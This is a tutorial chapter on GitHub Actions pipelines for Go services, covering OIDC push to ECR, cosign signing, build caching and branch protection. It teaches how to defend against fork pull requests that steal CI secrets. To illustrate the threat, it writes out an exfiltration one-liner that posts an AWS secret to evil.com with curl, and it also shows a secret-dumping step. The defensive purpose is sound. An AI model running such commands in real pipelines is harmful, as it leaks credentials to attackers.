# 15.02 — Application CI/CD pipelines

> The application-side CI/CD pipeline for the Bookstore Platform — GitHub
> Actions for the Go services (catalog, orders, payments-worker). Stages
> in real order with real action names; build caching strategy (Go
> modules + Docker buildx GHA cache); fail-fast; branch protection rules
> and required-vs-optional checks; the **"CI ate my repo" footgun**
> (untrusted-PR-with-secrets) and how the workflows defeat it; GitHub
> Actions **OIDC trust for ECR push** (no static AWS keys, ever);
> branch-environment separation. Walks the reader stage-by-stage through
> [`examples/bookstore-platform/ci/.github-workflows-catalog.yml`](../examples/bookstore-platform/ci/.github-workflows-catalog.yml).
> Deepens Part 07 ch.03 (which was generic, single-runtime, ghcr.io) by
> adding multi-arch, ECR + OIDC, integration test suites, the GitOps PR
> seam (two-repo), and the security-side rules that make a multi-service,
> multi-environment, multi-team CI safe at the platform level.

**Estimated time:** ~30 min read · ~90 min hands-on
**Prerequisites:** [Part 07 ch.03](../07-delivery/03-cicd-pipeline.md) — generic CI you'll now deepen for multi-service ECR · [Part 15 ch.01](./01-pr-to-production-lifecycle.md) — loop stages that frame the pipeline · [Part 14 ch.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md) — sibling infra CI/CD via OIDC

**You'll know after this:** • author a GitHub Actions workflow with build → test → scan → multi-arch image push to ECR in real stage order · • configure GitHub Actions OIDC trust for ECR push (no static AWS keys, ever) · • design build caching for Go modules + Docker buildx GHA cache to keep CI under 8 minutes · • defeat the "CI ate my repo" footgun (untrusted-PR-with-secrets) with `pull_request_target` discipline · • configure branch protection + required checks that map to environment promotion gates

<!-- tags: app-cicd, ci-cd, supply-chain, gitops, eks -->

## Why this exists

[ch.15.01](01-pr-to-production-lifecycle.md) drew the eight-stage loop;
stages 1–4 (commit, PR, CI, review/merge) and the front half of stage 5
(GitOps PR opened) are the **application CI pipeline**. Part 07 ch.03
already shipped a generic GitHub Actions workflow for the v1 Bookstore —
GHCR push, matrix over four services, the cosign keyless flow. That
chapter's job was teaching the *shape* of the pipeline.

This chapter's job is the production deepening. Three concrete gaps
between the v1 workflow and a real platform CI:

1. **Cloud-specific push paths** — the platform pushes to **ECR**, not
   GHCR, via short-lived OIDC role assumption (no static `AWS_ACCESS_KEY`
   in repository secrets). Part 14 ch.07 set up the same OIDC trust for
   Terraform's `apply`; application CI now consumes it.

2. **Per-service integration test suites** — the v1 services ship no
   tests; the v2 services have real test profiles (catalog reads a DB,
   orders writes a DB and publishes events, payments-worker consumes
   events and calls a payment-provider stub). Each workflow brings up
   the dependencies as GitHub Actions service containers and enforces a
   coverage gate calibrated to the service's risk profile.

3. **The GitOps-PR seam, in detail** — Part 07 ch.03 ended with `kustomize
   edit set image` + `git commit` on the same repo. The platform CI/CD
   pipeline opens a **PR against a separate GitOps repo** (the trust
   direction from ch.15.01); that PR's `body:` carries the cosign
   identity for human reviewers; the dev overlay PR auto-merges, the
   staging/prod overlay PRs require human review.

The chapter also names the **two pipeline-shaped security failures** Part
15 cares about most:

- **The "CI ate my repo" footgun** — an untrusted PR (from a fork or an
  external contributor) running a workflow that has access to secrets. A
  single `echo "$AWS_SECRET" > /tmp/x; curl evil.com -d @/tmp/x` step
  exfiltrates every secret the workflow can see. The workflows in
  [`examples/bookstore-platform/ci/`](../examples/bookstore-platform/ci/)
  structurally prevent it; this chapter shows how (path filters, the
  `if: github.event_name == 'push'` guard, the
  `pull_request_target` *non*-pattern).

- **Privileged action versions** — a workflow that uses `@v3` instead of
  a pinned commit SHA is downstream of every release that action publishes.
  This chapter does NOT pin actions to SHAs (a teaching simplification —
  the version pins are major-version-stable for the actions used), but it
  names the trade-off and the production hardening path.

This is the *Building Platform Services* concern from *Production
Kubernetes* ch.11 made specific to GitHub Actions + ECR + cosign; the
*Continuous Delivery* discipline from ch.15.01 turned into a real,
runnable workflow file.

## Mental model

**Application CI is a DAG of evidence-producing gates; its last step is
opening a PR. The platform's invariants are: trust direction, secret
scope, branch-environment mapping, and fail-fast.**

- **Trust direction (the one rule from ch.15.01).** CI **never** holds a
  cluster credential. CI gets:
  - ECR push permissions (via OIDC role assumption — short-lived; no
    static keys)
  - GitOps repo PR-write permissions (via a fine-grained PAT or GitHub
    App token, scoped to `contents: write` + `pull-requests: write` on
    *only* that repo)
  CI does **not** get: a `kubeconfig`, Argo CD admin tokens, Vault
  tokens, cluster service-account JWTs. Compromising CI compromises the
  registry + the GitOps repo's PR queue (bad enough — see "CI ate my
  repo" below), but **does not** give an attacker arbitrary cluster
  control. The cluster's apply rights belong to Argo CD's controller
  alone.

- **The DAG of evidence (stages 1–5 from ch.15.01).** Each stage's
  output is the next stage's input, and each output is queryable
  evidence:

  ```
  lint-test  ──►  integration-test  ──►  scan  ──►  build-sign-push  ──►  update-gitops-pr
   ↓             ↓                      ↓          ↓                     ↓
   coverage     test artefact           Trivy      digest + cosign       PR + body
   profile      (DB+broker logs)        report     cert + Rekor log      with cert
  ```

  The DAG's gates fire in order: lint failures stop before integration
  spends 5 minutes; integration failures stop before scan; HIGH/CRITICAL
  CVEs stop before signing. **Fail-fast** is not a slogan; it is the
  contract that lets the pipeline scale (a dozen services × multiple
  PRs/day) without blocking on shared infrastructure.

- **Per-service workflows, not one mega-workflow.** Each service in
  [`examples/bookstore-platform/ci/`](../examples/bookstore-platform/ci/)
  is one workflow file with **path filters** (`paths:
  ['app/catalog/**']`). A PR that touches only `app/orders/` does **not**
  run the catalog workflow. This is the platform-scale alternative to
  the v1 matrix-of-services pattern: per-service workflows isolate
  failure (one service's red workflow doesn't block another's merge),
  scale linearly (add a service = add a workflow file, no central
  re-wiring), and let each service tune its own test profile (catalog's
  70%-coverage vs payments-worker's 80%).

- **Coverage gates are calibrated to *risk*, not vibe.** catalog (read-
  only): no coverage gate, race detector on. orders (writes orders): 70%
  on `main` only — PRs are informational. payments-worker (money): 80%
  on every event, including PRs. The asymmetry encodes a real product
  decision: a money-handler bug is unrecoverable; a catalog read bug is
  a refresh. Cargo-culting one threshold across services trains
  developers to ignore it.

- **Branch-environment mapping is a *config*, not a workflow change.**
  `main` → `dev` overlay (auto-merge). A `release/*` branch or tag →
  `staging` overlay. A tag on `release/*` → `prod` overlay (with
  reviewers). Part 15 ch.04 (parallel phase 15b) shows the
  ApplicationSet that makes the env-overlay mapping declarative; this
  chapter wires the `main` → `dev` path so the rest is a configuration
  change.

- **The "CI ate my repo" footgun is structurally prevented, not just
  warned about.** Three layers of defence:
  1. The `if: github.event_name == 'push' && github.ref == 'refs/heads/main'`
     guard on the build-sign-push and update-gitops-pr jobs. Fork PRs
     run `lint-test`, `integration-test`, `scan` — **never** sign,
     **never** push, **never** open a GitOps PR.
  2. `permissions:` are minimal at workflow level (`id-token: write`,
     `contents: read`, `packages: read`) and widened nowhere. A fork PR's
     workflow can't write `contents:`.
  3. No `pull_request_target` triggers anywhere. (`pull_request_target`
     runs in the context of the base branch and has access to secrets —
     the single most common foot-gun. Use it only with extreme caution,
     never for build/test/push.)

The trap to keep in view: a CI that *gets it 90% right* is a CI that
ships an unsigned image or one wrong AWS-key environment, and the
fragility is invisible until the moment it matters. The discipline
(stated plainly): **CI's job is to produce evidence and a commit, and
*not* to hold cluster credentials, and *not* to run untrusted code with
secrets**. If those three rules hold, the rest is performance tuning.

## Diagrams

### The Bookstore catalog workflow — five jobs, real action names (Mermaid)

The
[`examples/bookstore-platform/ci/.github-workflows-catalog.yml`](../examples/bookstore-platform/ci/.github-workflows-catalog.yml)
DAG. Solid arrows are `needs:`; dashed arrows are the *outputs* each job
produces and the next consumes. The dotted boundary is the **CI/CD seam**
(ch.15.01) — the last node is a PR, not a deploy.

```mermaid
flowchart TD
    push["git push / merged PR<br/>(paths: app/catalog/**)"]
    lt["lint-test<br/>actions/setup-go@v5<br/>golangci/golangci-lint-action@v6<br/>go test -race -coverpkg=./..."]
    it["integration-test<br/>services: postgres:16-alpine<br/>go test -tags=integration -race"]
    sc{"scan<br/>aquasecurity/trivy-action@0.28.0<br/>exit-code 1, HIGH+CRITICAL"}
    bsp["build-sign-push<br/>docker/build-push-action@v6 (amd64+arm64)<br/>aws-actions/configure-aws-credentials@v4 (OIDC)<br/>aws-actions/amazon-ecr-login@v2<br/>sigstore/cosign-installer@v3 + cosign sign+attest<br/>anchore/sbom-action (syft)"]
    gp["update-gitops-pr<br/>actions/checkout@v4 (GITOPS_REPO)<br/>kustomize edit set image NAME@DIGEST<br/>peter-evans/create-pull-request@v7"]
    fail["FAIL the pipeline<br/>(stops BEFORE sign/push)"]
    git[("GitOps repo PR<br/>kustomize/overlays/dev<br/>(new digest)")]
    argo["Argo CD<br/>(Part 07 ch.04 — pulls)"]

    push --> lt --> it --> sc
    sc -- "clean" --> bsp -- "if push to main" --> gp
    sc -- "HIGH/CRITICAL" --> fail
    gp --> git
    git -. "CI/CD seam (ch.15.01)" .-> argo
```

### Branch-environment mapping (ASCII)

```
 EVENT                    BRANCH/REF                        OVERLAY    REVIEW
 ───────────────────────────────────────────────────────────────────────────────
 pull_request -> main     any feature/* branch              (none -    PR review
                                                            no push)   (1+ approver)
 push (merged PR)         refs/heads/main                   dev        auto-merge
 push (release branch)    refs/heads/release/X.Y           staging    1 reviewer
                          *parallel phase 15b
 tag                      refs/tags/vX.Y.Z                  prod       2 reviewers
                          *parallel phase 15b                          + on-call
 ───────────────────────────────────────────────────────────────────────────────
 The workflow's `if:` conditions enforce this:
   build-sign-push:     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
   (staging/prod variants set ref to release/* or refs/tags/v* — phase 15b)

 The "if push to main" guard is THE security boundary for fork PRs:
   - fork PR -> ONLY lint-test + integration-test + scan run
   - fork PR -> NO secrets accessible (GitHub omits secrets for fork PRs by default)
   - fork PR -> NO push to ECR, NO cosign sign, NO GitOps PR
   - merged PR (on main) -> the FULL pipeline runs (push + sign + PR)
```

## Hands-on with the Bookstore Platform

**Assumed working directory: the guide repo root (`full-guide/`).** This
chapter's hands-on is reading
[`examples/bookstore-platform/ci/.github-workflows-catalog.yml`](../examples/bookstore-platform/ci/.github-workflows-catalog.yml)
job-by-job, then running the *locally-reproducible* pieces of the
pipeline (the same idea as Part 07 ch.03 — what doesn't need OIDC or ECR
is shown runnable). The chapter is deliberately one workflow walk-through;
the orders and payments-worker workflows differ only in the test
profile, and their differences are summarised at the end.

### 0. What you can run locally (no OIDC, no ECR)

Mirror of Part 07 ch.03's local approximation, run from the repo root.
This is the **front half of the DAG** (stages 1–3); the back half needs
real cloud credentials.

```sh
# Stage 1 mirror — lint-test, locally:
cd examples/bookstore-platform/app/catalog        # the catalog service source
go mod download
go vet ./...
golangci-lint run --timeout=5m ./...
go test -race -count=1 -coverpkg=./... -coverprofile=coverage.out ./...
go tool cover -func=coverage.out | tail -1        # the same number CI prints

# Stage 2 mirror — integration-test, with a real Postgres in Docker:
docker run -d --name catalog-it-pg \
  -e POSTGRES_USER=catalog -e POSTGRES_PASSWORD=catalog -e POSTGRES_DB=catalog \
  -p 5432:5432 postgres:16-alpine
DB_DSN='postgres://catalog:catalog@localhost:5432/catalog?sslmode=disable' \
  go run ./cmd/migrate
DB_DSN='postgres://catalog:catalog@localhost:5432/catalog?sslmode=disable' \
  go test -tags=integration -race -count=1 ./...
docker rm -f catalog-it-pg

# Stage 3 mirror — Trivy scan, locally:
trivy fs --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed examples/bookstore-platform/app/catalog
# The CI uses the exact same flags; a clean local scan = clean CI scan (modulo
# CVE-database drift since Trivy publishes daily).
```

This is stages 1–3 verbatim. Stage 4 (build-sign-push) and stage 5
(update-gitops-pr) need ECR + OIDC + the GitOps repo PAT; the
[`sbom-and-sign.sh`](../examples/bookstore-platform/ci/sbom-and-sign.sh)
helper covers the cosign keyless half (with the honest caveat that a
laptop-driven cosign produces a *different OIDC subject* than the
workflow's — ch.15.03's territory).

### 1. The workflow, job by job

Open
[`examples/bookstore-platform/ci/.github-workflows-catalog.yml`](../examples/bookstore-platform/ci/.github-workflows-catalog.yml).
Five jobs, wired by `needs:`. Each is a "stage" from ch.15.01.

**Job 1 — `lint-test`** (`runs-on: ubuntu-latest`). Path-filtered to
`app/catalog/**`. Sets up Go with module cache keyed by `go.sum` (cache
hit → skip `go mod download`, saves ~30s/run). Runs `go vet`,
`golangci-lint` (via the official action), then
`go test -race -count=1 -coverpkg=./... -coverprofile=coverage.out`. The
`-coverpkg=./...` is important: by default Go counts coverage only in the
test's *own* package, which under-reports for a service with cross-
package tests. Uploads `coverage.out` as an artifact. **No cloud
credentials, no registry access.** This job runs on **every** PR and
**every** push — the fail-fast gate. (Honesty: the actual Go sources live
under `app/catalog/`. Phase 15a does not implement them; the workflow is
the contract a future build will satisfy.)

**Job 2 — `integration-test`** (`runs-on: ubuntu-latest`,
`needs: lint-test`). Brings up Postgres 16 as a **service container** —
GitHub Actions runs it on the runner with port-mapping, and the
`health-cmd` makes the runner *wait* for `pg_isready` before running
steps (without this, the first test races the container's startup and
flakes 1-in-10 runs). Sets `DB_DSN` env, runs `go run ./cmd/migrate` for
schema migration, then `go test -tags=integration` (build-tagged so unit
tests stay fast). orders.yml adds a `rabbitmq:3.13-management-alpine`
service container; payments-worker.yml adds both Postgres and RabbitMQ
and stubs the payment provider in a Go test helper bound to
`127.0.0.1:9000`. **No cloud credentials.**

**Job 3 — `scan`** (`runs-on: ubuntu-latest`, `needs: integration-test`).
Trivy filesystem scan over the service's directory with
`severity: HIGH,CRITICAL`, `exit-code: '1'`, `ignore-unfixed: true`.
`ignore-unfixed: true` is the deliberate choice (Part 07 ch.03 explains
the trade-off): CVEs with no upstream fix can't be remediated by a
rebuild, so gating on them is a false gate; the mitigation is *continuous
re-scanning* of published images (Part 05 ch.03). The job uploads the
report as an artifact for human inspection on failures. **No cloud
credentials yet.**

**Job 4 — `build-sign-push`** (`runs-on: ubuntu-latest`, `needs: scan`,
`if: github.event_name == 'push' && github.ref == 'refs/heads/main'`).
**This is the first job that needs cloud credentials, and the
`if:` guard is the security boundary.** A fork PR never reaches this
job. On a merged-to-`main` push:

1. `aws-actions/configure-aws-credentials@v4` with `role-to-assume:
   ${{ secrets.AWS_ROLE_ARN_ECR }}` and `audience: sts.amazonaws.com` —
   GitHub mints a short-lived JWT (the `id-token: write` permission
   above), STS swaps it for a 15-minute set of AWS credentials. **No
   long-lived AWS key is ever stored in the repo.**
2. `aws-actions/amazon-ecr-login@v2` logs Docker into ECR with those
   credentials.
3. `docker/setup-qemu-action@v3` + `docker/setup-buildx-action@v3` set
   up multi-arch builds. QEMU emulates arm64 on the amd64 runner — slow
   but reliable; for high-throughput builds, use a self-hosted arm64
   runner (Graviton) and skip QEMU. Part 14 ch.09 (parallel phase 14c)
   covers the Graviton migration; the workflow is **already Graviton-
   ready** because it builds multi-arch.
4. `sigstore/cosign-installer@v3` action installs the cosign CLI, with `cosign-release: 'v2.4.1'` pinning the binary version.
   `anchore/sbom-action/download-syft@v0.17.7` installs syft.
5. `docker/build-push-action@v6` builds the multi-stage Dockerfile,
   pushes the multi-arch manifest to ECR, tagged `sha-<COMMIT>` AND
   `latest-main`. The action exposes the manifest digest as
   `steps.build.outputs.digest`. `provenance: true` + `sbom: true`
   attach SLSA provenance + an SBOM to the manifest list directly (the
   buildx-native form); the explicit cosign attest below is the
   Sigstore-native form. Both formats coexist; different consumers
   prefer different shapes.
6. **Trivy again** — this time against the *pushed digest*
   (`image-ref: ...@${{ steps.build.outputs.digest }}`). This catches
   CVEs in the base image (distroless still has packages — `glibc`,
   `tzdata` — that may have published CVEs after the image was last
   refreshed). Same `--exit-code 1` gate. The two scans complement: the
   filesystem scan catches Go-module CVEs, the image scan catches
   base-layer CVEs.
7. `syft <IMAGE>@<DIGEST> -o spdx-json` — full SBOM as SPDX JSON, bound
   to the digest.
8. `cosign sign --yes <IMAGE>@<DIGEST>` — **keyless**. ch.15.03 unpacks
   this; the one-liner is: the runner uses its `id-token` JWT to
   authenticate to Sigstore Fulcio, which issues a ~10-minute X.509 cert
   bound to *this workflow's identity* (the cert's SAN is
   `https://github.com/GITHUB_ORG/REPO/.github/workflows/catalog.yml@refs/heads/main`
   — a Kyverno `verifyImages` rule can match exactly that). The cert +
   signature + a Rekor entry are stored; **no private key ever exists**.
9. `cosign attest --type spdxjson --predicate <SBOM> <IMAGE>@<DIGEST>` —
   the SBOM is bound to the digest as a cosign attestation, so a
   consumer can `cosign verify-attestation` and trust the SBOM via the
   signature chain.
10. The digest is written to `digest.txt` and uploaded as an artifact
    `digest-catalog`. Per-leg fan-in (Part 07 ch.03's matrix-fan-in
    note): a matrix-job's `outputs:` collapses to the last-finishing
    leg, so artifact-per-leg is the correct pattern.

**Job 5 — `update-gitops-pr`** (`runs-on: ubuntu-latest`,
`needs: build-sign-push`, same `if:` guard). The CI/CD seam.

1. `actions/checkout@v4` with `repository: ${{ vars.GITOPS_REPO }}` —
   checks out the **GitOps repo**, not the app repo. `token:
   ${{ secrets.GITOPS_PR_TOKEN }}` (a fine-grained PAT or GitHub App
   token scoped to `contents: write` + `pull-requests: write` on the
   GitOps repo *only*).
2. `actions/download-artifact@v4` for `digest-catalog`.
3. Install **pinned** kustomize (`v5.5.0`) via a release tarball — never
   the `install_kustomize.sh` master script (Part 07 ch.03's anti-pattern
   warning).
4. Validate the digest format (`grep '^sha256:'`) — refuse to write an
   empty or malformed digest. The shell guard catches the failure mode
   where a previous job silently produced an empty artifact, which would
   otherwise commit a broken image ref into the GitOps repo (a
   `bookstore/catalog@` with no digest = unsearchable, unfetchable, and
   `kubectl apply` would only fail at admission, after Argo CD synced
   it).
5. `cd gitops/kustomize/overlays/dev && kustomize edit set image
   bookstore/catalog=<REGISTRY>/bookstore/catalog@<DIGEST>`.
6. `peter-evans/create-pull-request@v7` opens a PR on a branch
   `bump/catalog-<SHA>`. The PR body includes the source workflow run
   ID and the commit SHA, so a reviewer can trace back to the cosign
   identity. **No auto-merge enabled here** — that is a branch-protection
   *rule* in the GitOps repo, not a workflow choice. The dev overlay PR
   may auto-merge if branch protection allows; staging/prod overlay PRs
   require human review (Part 15 ch.04, parallel phase 15b).

The five jobs are the eight stages from ch.15.01's loop, stages 3–5,
mapped 1:1 onto a runnable workflow file.

### 2. The orders and payments-worker workflows — what differs

The
[`.github-workflows-orders.yml`](../examples/bookstore-platform/ci/.github-workflows-orders.yml)
and
[`.github-workflows-payments-worker.yml`](../examples/bookstore-platform/ci/.github-workflows-payments-worker.yml)
files differ from catalog only in the test profile, calibrated to risk:

| Aspect | catalog | orders | payments-worker |
| --- | --- | --- | --- |
| Test profile | unit + Postgres IT | + RabbitMQ IT | + RabbitMQ IT + provider stub |
| Coverage gate | none | 70%, main only | 80%, every event |
| Race detector | unit only | unit only | unit + IT (concurrent consumer) |
| Integration timeout | 5m | 8m | 10m |

The rationale: catalog is read-only (a bug = a refresh), orders writes to
DB and publishes events (a bug = an inconsistent order, recoverable),
payments-worker handles money (a bug = a double-charge, unrecoverable).
The coverage gates are calibrated, not cargo-culted; the race detector is
on in the integration suite of payments-worker because its consumer pool
runs concurrent goroutines and a race here doubles a charge.

### 3. The "CI ate my repo" footgun, demonstrated by negation

Open the catalog workflow at the top:

```yaml
permissions:
  id-token: write
  contents: read
  packages: read
```

This is the *workflow-level* permission set. A fork PR's workflow runs
with this set, **minus** any secrets (GitHub omits secrets for fork PRs
by default). The `if: github.event_name == 'push' && github.ref ==
'refs/heads/main'` guard on `build-sign-push` and `update-gitops-pr`
means: even if a malicious PR added a step like `run: cat
$GITHUB_ENV; printenv`, the job carrying secrets *would not run* (the
`if:` is evaluated before any step in the job). The two together —
narrow workflow permissions + `if: github.event_name == 'push'` on
secret-needing jobs — are the structural defence. The two anti-patterns
to **never** use:

```yaml
# DO NOT use pull_request_target for build/test — it runs in the BASE
# branch's context, has access to secrets, and is the single most common
# fork-PR-exfiltrates-credentials vector. Use it only for non-mutating
# operations like label-on-PR.
on:
  pull_request_target:        # <-- DANGER

# DO NOT widen workflow-level permissions to write — set them on the JOB
# that needs them, not the workflow:
permissions:
  contents: write             # <-- workflow-wide write; bad
  packages: write             # <-- workflow-wide write; bad
```

The catalog workflow does neither. ch.15.03 shows the cosign cert that
makes the safe pattern *enforceable at admission* via Kyverno
`verifyImages`.

## How it works under the hood

- **OIDC trust between GitHub and AWS.** The
  `aws-actions/configure-aws-credentials@v4` step works because of a
  trust relationship configured *once* in AWS (Part 14 ch.07's territory):
  an IAM OIDC identity provider points at
  `token.actions.githubusercontent.com`, and an IAM role
  (`github-actions-ecr-catalog`) has a trust policy that says "any GitHub
  Actions JWT whose `sub` claim matches
  `repo:GITHUB_ORG/bookstore:ref:refs/heads/main` and whose audience is
  `sts.amazonaws.com` may assume me". When the workflow runs:
  1. GitHub mints a short-lived JWT signed by their key (the
     `id-token: write` permission unlocks this).
  2. The action exchanges the JWT at STS for ~15 minutes of AWS creds.
  3. The creds expire in 15 minutes whether the workflow finishes or
     not — a leak is bounded in time.
  No `AWS_ACCESS_KEY_ID` is ever in a GitHub secret. The whole pattern
  ports to GCP Workload Identity Federation and Azure OIDC Federation
  with one-line action changes; the model is identical.

- **The buildx cache and the Go cache are different things.** The Go
  cache (module + build cache) is keyed by `go.sum` via
  `actions/setup-go@v5`'s `cache: true` — a cache *hit* skips
  `go mod download` and reuses compiled packages (saves 30s+ per run).
  The Buildx cache (`cache-from: type=gha`) is keyed by job-scope
  (`scope: catalog`) and reuses Docker *layers* across runs — a cache
  hit means the multi-stage build's `go build` step doesn't re-run, and
  the `COPY --from=builder` only re-emits changed layers. Both caches
  are evicted by GitHub's 10GB-per-repo limit (LRU). Cache misses on a
  Monday morning (after a Friday evict) are *normal*; the build slows
  from 30s to 6m, the workflow still passes.

- **Service containers are real containers on the runner, not in-
  process mocks.** `services: postgres:` brings up the postgres image as
  a real Docker container on the GitHub-hosted runner before the job's
  steps execute; the runner's network namespace makes
  `localhost:5432` route to it. The `health-cmd` makes the runner *wait*
  for `pg_isready` before running the first step (without it, the first
  test races the container startup and flakes ~10% of the time on a
  cold runner). Service containers don't persist between jobs; each job
  brings up its own.

- **`docker/build-push-action` outputs the digest because the registry
  computes it on push.** A push uploads layer blobs + a manifest; the
  registry hashes the *manifest* and returns
  `sha256:HASH`. The action exposes this as
  `steps.build.outputs.digest`. The digest is **content-addressable**:
  if the bytes change, the digest changes; if the digest is stable, the
  bytes are stable. cosign signs *the string* `sha256:HASH`; kubelet
  pulling `<IMAGE>@sha256:HASH` re-hashes the pulled bytes and refuses
  to start the container if they don't match. This is the property that
  makes pinning by digest *mean* something — a tag is just a pointer
  that anyone with push access can move.

- **`peter-evans/create-pull-request@v7` reuses an existing PR if the
  branch already exists.** The action computes a branch name
  (`bump/catalog-<SHA>`); if a PR on that branch is already open, it
  pushes new commits to it instead of opening a duplicate. This matters
  when CI re-runs (e.g. someone re-runs the workflow after a flaky
  scan): the second run updates the existing PR rather than spawning
  N duplicates that humans then have to close. **Idempotency by
  branch-name** is the implementation detail; without it, the PR
  queue would be unusable at scale.

- **Branch protection rules on the GitOps repo are the security
  boundary for environment promotion.** The workflow opens PRs; the
  GitOps repo's branch protection decides who can merge them. Standard
  pattern:
    - dev overlay PRs: auto-merge enabled, no required reviewers.
    - staging overlay PRs: one required reviewer (the team owning the
      service); status check `argo-cd-staging-synced` must pass.
    - prod overlay PRs: two required reviewers (the team + a platform
      engineer); status checks `argo-cd-staging-synced` AND
      `argo-cd-staging-healthy-24h` must pass.
  Part 15 ch.04 (parallel phase 15b) shows the per-overlay workflow
  variants that emit the staging/prod PRs.

- **The path filter is a runner-minutes optimisation, not a security
  boundary.** `paths: ['app/catalog/**']` makes the catalog workflow
  *skip* when only `app/orders/` changes. It is a cost optimisation —
  GitHub-hosted runner minutes are not free — and a focus optimisation
  (PR reviewers only see relevant CI noise). It is **not** a security
  boundary: a malicious PR can be crafted to match any path filter,
  and changes to the workflow file itself bypass it. The security
  boundary remains the `if: github.event_name == 'push' && ref ==
  refs/heads/main` guard on secret-needing jobs.

## Production notes

> **In production: pin every action to a commit SHA, not a tag.** The
> workflows here pin to major versions (`actions/checkout@v4`) for
> teaching readability. Production hardening pins to commit SHAs
> (`actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11`) so a
> malicious release of an action cannot affect already-merged
> workflows. The tooling (`tj-actions/eslint-changed-files` 2024
> compromise) made this a live attack vector. Dependabot can keep SHA
> pins fresh.

> **In production: scope GitHub Actions secrets by environment.** Use
> GitHub Environments (Settings → Environments) with required reviewers
> to gate the `build-sign-push` step on staging/prod. The workflow then
> declares `environment: production`, the action waits for a reviewer
> approval before running, and the production-only secrets (e.g. a
> prod-only OIDC role ARN) live in that environment. The dev workflow
> sees only dev secrets. This is the GitHub Actions form of the
> Terraform `environment:` pattern Phase 14b's drift workflow uses.

> **In production: alert on workflow *infrastructure* failures, not
> just test failures.** A workflow that fails at "Configure AWS
> credentials via OIDC" is **not** a code problem — it is an
> infrastructure problem (the OIDC provider drifted, the role's trust
> policy changed, the IAM permissions were tightened). These look like
> CI failures in the GitHub UI but should page the platform team. Wire
> the workflow's failure webhook into PagerDuty's CI service (Part 15
> ch.10, parallel phase 15d) so a sustained "configure AWS credentials"
> failure pages, while a "test failed" notifies the service team.

> **In production: keep PR runs fast (< 5 min) and main runs strict.**
> The asymmetry is real: PR runs need to be fast enough that developers
> don't context-switch waiting for green; main runs can be slow because
> they only happen on merge. The workflows here implement this — PR runs
> have informational coverage; main runs gate strictly. Time-budget the
> PR pipeline (lint + unit + scan = ≤3m on a cache hit) and accept
> that integration tests run only on main if needed. (orders.yml runs
> integration on PR; payments-worker's integration is fast enough; if
> a service's integration suite goes over budget, split the heavy
> bits to a separate `nightly:` workflow.)

> **In production: use a separate runner pool for the publish path.**
> GitHub-hosted runners are shared (theoretically isolated, but
> defense-in-depth is cheap). For the `build-sign-push` and
> `update-gitops-pr` jobs, use **self-hosted runners** in a controlled
> network, or use GitHub-hosted larger runners with `actions/runner` in
> an account-bound configuration. The OIDC creds are short-lived, but
> the runner's local filesystem during the job has the cert + key in
> memory. The cost is a self-hosted runner pool; the benefit is a
> tighter blast radius.

> **In production: the workflow file is *also* code; review it like
> code.** A change to `.github/workflows/catalog.yml` should require
> the same review path as a change to `app/catalog/main.go`. The
> branch protection rules apply equally; in fact, the workflow file is
> the *more* important code review, because it is the pipeline that
> reviews all other code. CODEOWNERS for `.github/` to the platform
> team is the standard pattern.

## Quick Reference

```sh
# Inspect the catalog workflow (the canonical pipeline of this Part):
cat examples/bookstore-platform/ci/.github-workflows-catalog.yml

# Run the locally-reproducible stages (no OIDC, no ECR):
( cd examples/bookstore-platform/app/catalog && \
    go mod download && go vet ./... && \
    go test -race -count=1 -coverpkg=./... ./... )
trivy fs --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed \
  examples/bookstore-platform/app/catalog

# View the workflow runs (when CI is wired):
gh -R GITHUB_ORG/bookstore run list --workflow catalog.yml
gh -R GITHUB_ORG/bookstore run view  WORKFLOW_RUN_ID --log

# Inspect the GitOps PRs the workflow opens:
gh -R GITHUB_ORG/bookstore-gitops pr list --search 'bump:'
gh -R GITHUB_ORG/bookstore-gitops pr view  PR_NUM

# Local cosign keyless dry-run (for hotfix or ad-hoc signing):
./examples/bookstore-platform/ci/sbom-and-sign.sh catalog \
  'AWS_ACCOUNT_ID.dkr.ecr.AWS_REGION.amazonaws.com/bookstore/catalog@sha256:DIGEST-HEX'
```

Minimal workflow skeleton (the shape; full file in
[`examples/bookstore-platform/ci/`](../examples/bookstore-platform/ci/)):

```yaml
name: <SERVICE>-ci
on:
  pull_request: { paths: ['app/<SERVICE>/**'] }
  push:         { branches: [main], paths: ['app/<SERVICE>/**'] }
permissions: { id-token: write, contents: read, packages: read }
concurrency:  { group: <SERVICE>-ci-${{ github.ref }}, cancel-in-progress: true }
jobs:
  lint-test:                          # stage 3a — fast gate
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version: '1.23', cache: true, cache-dependency-path: app/<SERVICE>/go.sum }
      - run: go vet ./... && go test -race -count=1 ./...
  integration-test:                   # stage 3b — DB/broker via service containers
    runs-on: ubuntu-latest
    needs: lint-test
    services:
      postgres: { image: postgres:16-alpine, ports: ['5432:5432'], options: '--health-cmd "pg_isready"' }
    steps: [ ... go test -tags=integration ... ]
  scan:                               # stage 3c — Trivy GATE (exit-code 1)
    runs-on: ubuntu-latest
    needs: integration-test
    steps: [ { uses: aquasecurity/trivy-action@0.28.0, with: { exit-code: '1' } } ]
  build-sign-push:                    # stage 4 — only on push to main; OIDC + cosign keyless
    runs-on: ubuntu-latest
    needs: scan
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps:
      - uses: aws-actions/configure-aws-credentials@v4    # OIDC, no static keys
      - uses: docker/build-push-action@v6                # multi-arch, push by DIGEST
      - run: cosign sign --yes <IMAGE>@<DIGEST>           # keyless, ch.15.03
  update-gitops-pr:                   # stage 5 — open PR on GitOps repo (NOT kubectl apply)
    needs: build-sign-push
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps: [ { uses: peter-evans/create-pull-request@v7 } ]
```

Checklist:

- [ ] Five-job DAG: lint-test → integration-test → scan →
      build-sign-push → update-gitops-pr; fail-fast at each gate
- [ ] **OIDC** for ECR push (no static AWS keys in repo secrets);
      `id-token: write` workflow permission
- [ ] `if: github.event_name == 'push' && github.ref ==
      'refs/heads/main'` on the secret-needing jobs (the "CI ate my
      repo" structural defence)
- [ ] No `pull_request_target` triggers anywhere; minimal workflow-
      level `permissions:` (`contents: read`, not `contents: write`)
- [ ] Multi-arch buildx (amd64 + arm64) so Part 14 ch.09 Graviton
      migration is a config bump, not a code change
